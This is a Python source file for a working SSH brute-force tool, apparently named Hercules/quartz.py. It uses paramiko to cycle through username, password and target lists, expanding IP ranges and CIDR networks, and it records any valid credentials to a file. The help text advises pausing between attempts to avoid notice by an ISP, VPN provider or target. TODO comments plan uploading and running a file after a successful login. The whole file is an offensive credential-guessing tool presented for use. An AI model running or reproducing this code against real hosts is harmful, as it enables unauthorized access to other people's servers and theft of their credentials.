import argparse
import datetime
import ipaddress
import socket
import sys
from os import remove
from pathlib import Path
from time import sleep
from uuid import uuid4

import paramiko

sys.path.append("../../../")
import ColorPrint

OUTPUT_FILE = None
USERNAME_FILE, HOST_FILE, PASSWORD_FILE, ATTEMPT_LOG = "", "", "", ""
REST_TYPE, REST_SLEEP = [], 0
VERBOSE, DEBUG, NEXT_FLAG = False, False, False
SKIPPED_CODES = []


def ConnectSSH(hostname, username, password, timeout=0):
    # RUN THE SCRIPT WITH THE ERROR CODES FLAG TO VIEW THE MEANING OF THE ERROR CODES
    #
    global ATTEMPT_LOG

    sshclient = paramiko.SSHClient()
    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ATTEMPT_LOG = "Host: '{}' Username: '{}' Password: '{}'".format(hostname, username, password)

    try:
        if VERBOSE:
            ColorPrint.PrintColor(ColorPrint.INFO, "Trying: " + ATTEMPT_LOG)
        sshclient.connect(hostname, username=username, password=password, timeout=10, banner_timeout=20)
        ColorPrint.PrintColor(ColorPrint.SUCCESS, "Found Credentials [CODE 99]", ATTEMPT_LOG, 26)
        if OUTPUT_FILE is not None:
            OUTPUT_FILE.write(str(datetime.datetime.now()).split('.')[0] + "\n")
            OUTPUT_FILE.write(ATTEMPT_LOG + "\n")
        try:
            sshclient.close()
            sshclient.get_transport().close()
        except:
            pass

        sleep(timeout)

        return 99
    except paramiko.AuthenticationException:
        if VERBOSE:
            ColorPrint.PrintColor(ColorPrint.FAILED, "Authentication Failed [CODE 1]",
                                  "Failed credentials - " + ATTEMPT_LOG, 32)

        return 1
    except paramiko.ssh_exception.NoValidConnectionsError:
        if DEBUG:
            ColorPrint.PrintColor(ColorPrint.FAILED, "Unable to establish a connection [CODE 2]",
                                  "Service may be off - " + ATTEMPT_LOG, 11)

        return 2
    except (TimeoutError, socket.timeout):
        if DEBUG:
            ColorPrint.PrintColor(ColorPrint.WARN, "Connection Timed Out [CODE 3]", "Failed Session - " + ATTEMPT_LOG,
                                  23)

        return 3
    except OSError as e:
        if "Errno 64" in str(e):
            if DEBUG:
                ColorPrint.PrintColor(ColorPrint.WARN, "Host is down or unresponsive [CODE 4]",
                                      "Failed Session - " + ATTEMPT_LOG, 22)
            return 4

    except (paramiko.ssh_exception.SSHException, EOFError):
        pass
    except Exception as e:
        if DEBUG:
            ColorPrint.PrintColor(ColorPrint.WARN, "An Unknown Error Occurred [CODE 0]",
                                  'Error on line {ln} {te} {ex}'.format(ln=sys.exc_info()[-1].tb_lineno, te=type(e),
                                                                        ex=e),
                                  31)
        return 0


def SSHEnumSingleFile(PASSWORD, USERNAME, HOST):
    if DEBUG:
        ColorPrint.PrintColor(ColorPrint.INFO, "Enumerating 1 File...")
    cred_sets = 0
    if PASSWORD_FILE:
        f = PASSWORD
    elif USERNAME_FILE:
        f = USERNAME
    else:
        f = HOST
    ColorPrint.PrintColor(ColorPrint.INFO, "Trying " + str(CountEntries(f)) + " entries")
    with open(f, 'r') as file:
        for line in file:
            line = line.strip("\n")
            if PASSWORD_FILE:
                line_p = line
                line_h = HOST
                line_u = USERNAME
            elif USERNAME_FILE:
                line_u = line
                line_h = HOST
                line_p = PASSWORD
            else:
                line_h = line
                line_u = USERNAME
                line_p = PASSWORD
            try:
                code = ConnectSSH(line_h, str(line_u), str(line_p))
                if code == 99:
                    cred_sets += 1
                # Skip authentication attempts for passwords and usernames to a given host that returns a specified error code
                if (code in SKIPPED_CODES) and not HOST_FILE:
                    if DEBUG:
                        ColorPrint.PrintColor(ColorPrint.INFO, "Received 'CODE " + str(
                            code) + "', skipping set. " + ColorPrint.FAIL + "DEBUG INFO: " + ATTEMPT_LOG)
                    break

                if HOST_FILE:
                    loop_type = "hostnames"
                elif PASSWORD_FILE:
                    loop_type = "passwords"
                else:
                    loop_type = "usernames"
                CalcRestPeriod(loop_type, REST_SLEEP)
            except KeyboardInterrupt:
                print()
                ColorPrint.PrintColor(ColorPrint.INFO, "Detected Keyboard Interrupt")
                return
            except:
                pass

        return cred_sets


def SSHEnumTwoFiles(PASSWORD, USERNAME, HOST):
    if DEBUG:
        ColorPrint.PrintColor(ColorPrint.INFO, "Enumerating 2 Files...")
    count_p, count_u, count_h = 1, 1, 1
    cred_sets = 0

    if PASSWORD_FILE and USERNAME_FILE:
        pri_one = USERNAME
        pri_two = PASSWORD
        count_p = CountEntries(PASSWORD)
        count_u = CountEntries(USERNAME)
    elif PASSWORD_FILE and HOST_FILE:
        pri_one = HOST
        pri_two = PASSWORD
        count_p = CountEntries(PASSWORD)
        count_h = CountEntries(HOST)
    elif USERNAME_FILE and HOST_FILE:
        pri_one = HOST
        pri_two = USERNAME
        count_h = CountEntries(HOST)
        count_u = CountEntries(USERNAME)

    total_comb = count_h * count_u * count_p
    ColorPrint.PrintColor(ColorPrint.INFO, "Trying " + str(total_comb) + " combinations")

    with open(pri_one, 'r') as outer_loop_file:
        for entry_outer in outer_loop_file:
            entry_outer = entry_outer.strip("\n")
            with open(pri_two, 'r') as inner_loop_file:
                for entry_inner in inner_loop_file:
                    entry_inner = entry_inner.strip("\n")
                    if pri_one == HOST:
                        HOST_line = entry_outer
                    elif pri_two == HOST:
                        HOST_line = entry_inner
                    else:
                        HOST_line = HOST

                    if pri_one == PASSWORD:
                        passphrase_line = entry_outer
                    elif pri_two == PASSWORD:
                        passphrase_line = entry_inner
                    else:
                        passphrase_line = PASSWORD

                    if pri_one == USERNAME:
                        user_line = entry_outer
                    elif pri_two == USERNAME:
                        user_line = entry_inner
                    else:
                        user_line = USERNAME

                    code = ConnectSSH(HOST_line, str(user_line), passphrase_line)
                    if code == 99:
                        cred_sets += 1

                    if (code in SKIPPED_CODES) and HOST_FILE:
                        if DEBUG:
                            ColorPrint.PrintColor(ColorPrint.INFO, "Received 'CODE " + str(
                                code) + "', skipping set. " + ColorPrint.FAIL + "DEBUG INFO: " + ATTEMPT_LOG)
                        break

                    rest_match = False
                    if "passwords" in REST_TYPE and pri_two == PASSWORD:
                        rest_match = True
                    elif "usernames" in REST_TYPE and pri_two == USERNAME:
                        rest_match = True
                    elif "hostnames" in REST_TYPE and pri_two == HOST:
                        rest_match = True

                    if rest_match:
                        ColorPrint.PrintColor(ColorPrint.INFO, "Sleeping for " + str(REST_SLEEP) + " seconds... ")
                        sleep(REST_SLEEP)

        rest_match = False
        if "passwords" in REST_TYPE and pri_one == PASSWORD:
            rest_match = True
        elif "usernames" in REST_TYPE and pri_one == USERNAME:
            rest_match = True
        elif "hostnames" in REST_TYPE and pri_one == HOST:
            rest_match = True

        if rest_match:
            ColorPrint.PrintColor(ColorPrint.INFO, "Sleeping for " + str(REST_SLEEP) + " seconds... ")
            sleep(REST_SLEEP)

    return cred_sets


def SSHEnumThreeFiles(PASSWORD, USERNAME, HOST):
    if DEBUG:
        ColorPrint.PrintColor(ColorPrint.INFO, "Enumerating 3 Files...")
    total_comb = CountEntries(PASSWORD) * CountEntries(USERNAME) * CountEntries(HOST)
    ColorPrint.PrintColor(ColorPrint.INFO, "Trying " + str(total_comb) + " combinations")
    cred_sets = 0
    break_flag = False
    code = None

    with open(HOST, 'r') as outer_loop_file:
        for hostname in outer_loop_file:
            code = None
            break_flag = False
            hostname = hostname.strip("\n")
            with open(USERNAME, 'r') as med_loop_file:
                for user in med_loop_file:
                    user = user.strip("\n")
                    with open(PASSWORD, 'r') as inner_loop_file:
                        for passphrase in inner_loop_file:
                            passphrase = passphrase.strip("\n")
                            code = ConnectSSH(hostname, user, passphrase, )
                            if code == 99:
                                cred_sets += 1
                            CalcRestPeriod("passwords", REST_SLEEP)
                            if code in SKIPPED_CODES:
                                if DEBUG:
                                    ColorPrint.PrintColor(ColorPrint.INFO, "Received 'CODE " + str(
                                        code) + "', skipping set. " + ColorPrint.FAIL + "DEBUG INFO: " + ATTEMPT_LOG)
                                break_flag = True
                                break

                    if break_flag:
                        break

                    CalcRestPeriod("usernames", REST_SLEEP)

            CalcRestPeriod("hostnames", REST_SLEEP)

    return cred_sets


def ConvertIPRangetoList(range):
    '''input is in the form  x.x.x.x-y.y.y.y'''
    ip_start = range.split('-')[0]
    ip_end = range.split('-')[1]
    start = list(map(int, ip_start.split(".")))
    end = list(map(int, ip_end.split(".")))
    temp = start
    ip_range = []

    ip_range.append(ip_start)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i - 1] += 1
        ip_range.append(".".join(map(str, temp)))

    return ip_range


def ConverCyderToIPs(cyder_address):
    '''Takes in an IP network in cyder notation and formats it in a str list of IPs'''
    new_ip_list = []

    try:

        ip_list = list(ipaddress.IPv4Network(cyder_address).hosts())
        # print(ip_list)
        if DEBUG:
            ColorPrint.PrintColor(ColorPrint.INFO, "Translating {len} IP(s)".format(len=len(ip_list)))
        for elem in ip_list:
            new_ip_list.append(str(elem))
        return new_ip_list

    except Exception as e:
        ColorPrint.PrintColor(ColorPrint.FAILED, "Unable to parse IPs [CODE 5]", "Quitting...")
        if DEBUG:
            ColorPrint.PrintColor(ColorPrint.INFO,
                                  'Error on line {ln} {te} {ex}'.format(ln=sys.exc_info()[-1].tb_lineno, te=type(e),
                                                                        ex=e))
        sys.exit(0)


def CountEntries(filename):
    count = 0
    with open(filename, 'r') as file:
        for line in file:
            count += 1
    return count


def CalcRestPeriod(auth_type, seconds):
    try:
        if auth_type in REST_TYPE:
            if VERBOSE:
                ColorPrint.PrintColor(ColorPrint.INFO, "Sleeping for " + str(seconds) + " seconds... ")
            sleep(seconds)
    except KeyboardInterrupt:
        print()
        ColorPrint.PrintColor(ColorPrint.INFO, "Detected Keyboard Interrupt, Quitting...")
        sys.exit(0)
    except Exception as e:
        if DEBUG:
            ColorPrint.PrintColor(ColorPrint.WARN, "An Unknown Error Occurred [CODE 0]",
                                  'Error on line {ln} {te} {ex}'.format(ln=sys.exc_info()[-1].tb_lineno, te=type(e),
                                                                        ex=e),
                                  31)


def main():

    global USERNAME_FILE, OUTPUT_FILE
    global PASSWORD_FILE
    global HOST_FILE
    global VERBOSE
    global DEBUG
    global SKIPPED_CODES
    global NEXT_FLAG, REST_TYPE, REST_SLEEP

    banner = """
                                                               _
                                      ____ _   _ _____  ____ _| |_ _____
                                     / _  | | | (____ |/ ___|_   _|___  )
                                    | |_| | |_| / ___ | |     | |_ / __/
                                     \__  |____/\_____|_|      \__|_____)
                                        |_|

                                        SSH Bruteforcer Assistant v1.00
                                      by MidnightSeer - thevanoutside.com

                Hercules is an SSH bruteforcing tool to automate the job of rolling through lists or usernames,
                passwords, and targets to find valid sets of credentials.  Keep it simple stupid."""

    if len(sys.argv) == 1:
        print(banner)

        sys.exit(1)

    parser = argparse.ArgumentParser(description="This tool will automate ssh bruteforcing tasks",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog='''
Examples:
1. quartz.py -u admin -p 12345678 -t 10.0.0.1
    Try to authenticate to '10.0.0.1' with username 'admin' and password '12345678'
2. quartz.py -u root -p '1qz!QAZ' -t 10.0.0.1-10.0.0.15 --save succ_auths_3.txt -d
    Now includes an IP range and saves valid (successful authentication) credentials to
    the specified file.  Also triggers debug mode to view all errors
3. quartz.py -u names.txt -p passwords.lst -t 10.0.0.0/24 --proceed-on-success --skip-code 2,3,4 -v
    Now it uses a username file, password file, and target IP network in cyder notation.  The script
    skips to the next host after a successful authentication regardless of remaining usernames and passwords.
    --skip-code tells the script to move to the next host if it encounters a specified code.
    This is usually done to skip the bruteforcing of a host that is non-existent or not responsive.  See
    the response codes to identify the available codes.  Lastly, the -v or verbose flag
    with output all authentication attempts regardless of success or fail.  By default, you will only see the
    successful authentications.  It is important to note, that --process-on-success is the same as --skip 99.
4. quartz.py -u admin -p 'pas!!ord123' -t 10.0.0.1 --skip-code 2,3,4 -v -r hostnames -s 7 --save succ_auths_3.txt -d
    The new options here show that 1) you must enclose your password string in SINGLE quotes to preserve the integrity
    of the special characters 2) -r signals the script to rest (or sleep) for each iteration of "hostnames" for 7
    (-s) seconds.

3 Main Parts:
hostname -
- Can be either a file or a single string (hosts.txt or 10.0.0.1)
- Can be a range of IPs (10.0.0.1-10.0.0.28) NOTE: There are no spaces.
- Can be in cyder notation (10.0.0.0/26)
username -
- Can be either a file or a single string
password -
- Can be either a file or a single string

IMPORTANT - In a file, each entry is on a single line

        ********************************CUSTOM RESPONSE CODE DEFINITIONS********************************

        CODE 0  --  AN UNKNOWN ERROR OCCURRED.  YOU'LL NEED TO VIEW THE ERROR DUMP TO RESOLVE THE ERROR.
        CODE 1  --  AUTHENTICATION FAILED (WRONG CREDENTIALS). SERVICE IS UP.
        CODE 2  --  UNABLE TO ESTABLISH A CONNECTION. POSSIBILITY: (1) EITHER THE SSH SERVICE IF OFF
                    ON THAT HOST:PORT (22) OR (2) YOU ARE BEING DROPPED BY A SECURITY DEVICE.
        CODE 3  --  CONNECTION TIMED OUT.  POSSIBILITY: (1) YOU ARE UNABLE TO ROUTE TO THAT HOST, (2)
                    YOUR TRAFFIC IS BEING DROPPED BY A SECURITY DEVICE, OR (3) THAT HOST DOES NOT EXIST.
        Code 4  --  HOST IS DOWN OR IS NOT RESPONDING TO OUR PROBES.  THIS COULD BE INDICATIVE THAT OUR
                    TRAFFIC IS BEING SILENTLY DROPPED OR THE HOST DOES NOT EXIST.
        Code 5  --  DETECTED IP ADDRESSES IN CYDER NOTATION BUT IS UNABLE TO BREAK UP THE ADDRESSES INTO A
                    FILE.  RUN THE SCRIPT WITH -d TO SEE THE FULL PYTHON ERROR.  IF YOU GET THIS ERROR, TRY
                    TO USE A FILE CONTAINING ALL HOST NAMES WITH THE -t ARGUMENT VICE CYDER NOTATION.
        CODE 99 --  SUCCESSFULLY FOUND A SET OF CREDENTIALS FOR THE GIVEN SSH CONNECTION.

''')

    # restrict = parser.add_mutually_exclusive_group()
    parser.add_argument('-u', '--username', action='store', dest='username', type=str, metavar="[USERNAME]",
                        required=True,
                        help='The username to log in as.  Will try to read a file with a [USERNAME] name before defaulting to a string.')
    parser.add_argument('-p', '--password', action='store', dest='password', type=str, metavar="[PASSWORD]",
                        required=True,
                        help='The password to try for a given user.  Will try to read a file with a [PASSWORD] name before defaulting to a string.')
    parser.add_argument('-t', '--target', action='store', dest='hostname', type=str, metavar="[HOSTNAME/IP/RANGE]",
                        required=True,
                        help='''The hostname or IP address to try to login to.  Will try to read a file with a [HOSTNAME/IP] name before defaulting to a string.
                                Will also accept an IP range ie. 10.0.0.1-10.0.0.20 [no space].
                                PRO TIP: Sort the file for unique values to prevent re-attempting the same host again.
                                ''')
    parser.add_argument('-s', '--sleep', action='store', dest='sleep', type=str, metavar="[MINUTES TO SLEEP]",
                        required=False,
                        help='''Time in minutes to rest in between attempts.  Defaults to 0 sec.
                                PRO TIP: You may want to add some time between attempts in case your VPN provider,
                                ISP, or target is monitoring the traffic.  Combined with -r, this becomes the rest time
                                in between authentication attempts of that specific type.
                                ''')
    parser.add_argument('-r', '--rest-between', action='store', dest='rest', nargs='+', type=str, metavar="[AUTH-TYPE]",
                        required=False, choices=["hostnames", "usernames", "passwords"],
                        help='''Rest between attempts of either type hostname, username, or password.  Must be used with -s.''')
    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
                        required=False,
                        help='This will print if the authentication attempt failed.  Otherwise you will only see the successful authentications')
    parser.add_argument('-d', '--debug', action='store_true', dest='debug',
                        required=False, help='This will print all error messages')
    parser.add_argument('--save', action='store', dest='save_file', metavar='[SAVE FILE]',
                        required=False, help='''Save all successful authentications to a file.  Please use a different save file each script execution
                                             instance. A previous file will be overwritten.''')
    parser.add_argument('--skip-code', action='store', dest='skip', type=str, metavar="[ERROR CODE TO SKIP]",
                        required=False,
                        help='''This will skip your specified error codes for that host.  Useful if you want to
                                skip an entire host if you encountered a timeout.
                                Example: --skip 2,3
                                ''')
    parser.add_argument('--proceed-on-success', action='store_true', dest='next', required=False,
                        help='''Move to the next target host if there is after the first successful authentication
                                    ''')
    # TODO ADD THE OPTION TO UPLOAD A FILE AND EXECUTE IT UPON SUCCESSFUL CONNECTION
    # TODO ADD A METASPLOIT LIKE COMMAND INTERFACE
    args = parser.parse_args()

    if (args.rest and not args.sleep) or (args.sleep and not args.rest):
        print("You must use -r and -s together!")
        sys.exit(0)


    elif args.rest and args.sleep:
        REST_TYPE = args.rest
        REST_SLEEP = int(args.sleep)

    # If the error flag is an argument

    USERNAME = args.username
    USERNAME_FILE = False
    PASSWORD = args.password
    PASSWORD_FILE = False
    HOST = args.hostname
    HOST_FILE = False

    debug_info = '''
            *******DEBUG INFO*******
            ARGUMENTS:              {}
            USERNAME:               {}
            PASSWORD:               {}
            HOST:                   {}
            SKIP CODES:             {}
            SELECTED REST TYPES:    {} SLEEP FOR {}
            VERBOCITY:              {}

            TIME SCRIPT STARTED:    {}
            '''.format(
        str(sys.argv),
        USERNAME,
        PASSWORD,
        HOST,
        str(SKIPPED_CODES),
        str(REST_TYPE),
        str(REST_SLEEP),
        str(VERBOSE),
        str(datetime.datetime.now()).split('.')[0]
    )

    if args.debug:
        DEBUG = True
        print(debug_info)

    # CONVERT CYDER NOTATION
    # CONVERT RANGE NOTATION x.x.x.x-y.y.y.y

    test1 = "-" in args.hostname
    test2 = "/" in args.hostname
    TMP_FILE = None
    if (not Path(HOST).is_file()) and (test1 or test2):
        TMP_FILE = "." + str(uuid4())
        host_ip_list = []
        if "-" in args.hostname:
            if DEBUG:
                ColorPrint.PrintColor(ColorPrint.INFO,
                                      "Detected an IP Range, Attempting to Translate into a file...")
            try:
                host_ip_list = ConvertIPRangetoList(args.hostname)
            except Exception as e:
                ColorPrint.PrintColor(ColorPrint.WARN, "Address is not a recognizable IP, IP Range, or Cyder Notation",
                                      "Format: x.x.x.x, x.x.x.x-y.y.y.y, x.x.x.x/y" + ATTEMPT_LOG, 4)
                if DEBUG:
                    ColorPrint.PrintColor(ColorPrint.WARN, "An Unknown Error Occurred [CODE 0]",
                                          'Error on line {ln} {te} {ex}'.format(ln=sys.exc_info()[-1].tb_lineno,
                                                                                te=type(e), ex=e), 31)

        elif "/" in args.hostname:
            if DEBUG:
                ColorPrint.PrintColor(ColorPrint.INFO,
                                      "Detected Cyder Notation, Attempting to Translate into a file...")
            try:
                host_ip_list = ConverCyderToIPs(args.hostname)

            except Exception as e:
                ColorPrint.PrintColor(ColorPrint.WARN, "Address is not a recognizable IP, IP Range, or Cyder Notation",
                                      "Format: x.x.x.x, x.x.x.x-y.y.y.y, x.x.x.x/y" + ATTEMPT_LOG, 4)
                if DEBUG:
                    ColorPrint.PrintColor(ColorPrint.WARN, "An Unknown Error Occurred [CODE 0]",
                                          'Error on line {ln} {te} {ex}'.format(ln=sys.exc_info()[-1].tb_lineno,
                                                                                te=type(e), ex=e), 31)
        try:
            with open(TMP_FILE, 'w+') as tmp_file:
                for ip in host_ip_list:
                    tmp_file.write(ip + "\n")
        except Exception as e:
            if DEBUG:
                ColorPrint.PrintColor(ColorPrint.WARN, "An Unknown Error Occurred [CODE 0]",
                                      'Error on line {ln} {te} {ex}'.format(ln=sys.exc_info()[-1].tb_lineno,
                                                                            te=type(e), ex=e), 31)
        HOST = TMP_FILE
        HOST_FILE = True

    if args.next:  # Add the authentication successfull code to the skipped code
        # to move on to the next host after successful authentication
        SKIPPED_CODES.append(99)

    # Format the skipped error codes into a list
    if args.skip:
        SKIPPED_CODES_ARGS = args.skip.split(',')
        for i in SKIPPED_CODES_ARGS:  # Convert the str list into int
            SKIPPED_CODES.append(int(i))

    if args.verbose:
        VERBOSE = True

    if args.save_file:
        save_file = args.save_file
        try:
            with open(save_file, 'w+') as OUTPUT_FILE:
                if DEBUG:
                    OUTPUT_FILE.write(debug_info + "\nStart of Logging:\n")
                SSHLogic(HOST, USERNAME, PASSWORD)
                end_banner = "\nScript Finished: " + str(datetime.datetime.now()).split('.')[0]
                OUTPUT_FILE.write(end_banner + "\n")
                CleanUpActions(TMP_FILE)
        except Exception as e:
            if DEBUG:
                ColorPrint.PrintColor(ColorPrint.WARN, "An Unknown Error Occurred [CODE 0]",
                                      'Error on line {ln} {te} {ex}'.format(ln=sys.exc_info()[-1].tb_lineno, te=type(e),
                                                                            ex=e), 31)
        finally:
            ColorPrint.PrintColor(ColorPrint.SUCCESS, "Saved Any Valid Credentials to ", save_file, 31)
    else:
        SSHLogic(HOST, USERNAME, PASSWORD)
        CleanUpActions(TMP_FILE)


def SSHLogic(HOST, USERNAME, PASSWORD):
    global USERNAME_FILE, HOST_FILE, PASSWORD_FILE
    truth_table = 0
    cred_sets = None

    if Path(USERNAME).is_file():
        USERNAME_FILE = True
        truth_table += 1

    if Path(PASSWORD).is_file():
        PASSWORD_FILE = True
        truth_table += 1

    if Path(HOST).is_file():
        HOST_FILE = True
        truth_table += 1

    # If none of the arguments are files
    if truth_table == 0:
        ConnectSSH(HOST, USERNAME, PASSWORD)

    # If only one argument is a file
    elif truth_table == 1:
        cred_sets = SSHEnumSingleFile(PASSWORD, USERNAME, HOST)

    # If two arguments are a file
    elif truth_table == 2:
        cred_sets = SSHEnumTwoFiles(PASSWORD, USERNAME, HOST)

    # If three arguments are a file
    elif truth_table == 3:
        cred_sets = SSHEnumThreeFiles(PASSWORD, USERNAME, HOST)

    if cred_sets is not None:
        print(ColorPrint.BLUE)
        ColorPrint.PrintColor(None, "Enumeration Complete ", "Found " + str(cred_sets) + " sets of credentials", 42)
        if OUTPUT_FILE is not None:
            OUTPUT_FILE.write("\nFound " + str(cred_sets) + " sets of credentials\n")


def CleanUpActions(tmp_file=None):
    if DEBUG:
        ColorPrint.PrintColor(ColorPrint.INFO, "Starting Cleanup Actions...")
    if tmp_file is not None and Path(tmp_file).is_file:
        remove(tmp_file)
    ColorPrint.PrintColor(ColorPrint.INFO, "Quitting...")
    sys.exit(0)


if __name__ == '__main__':
    main()
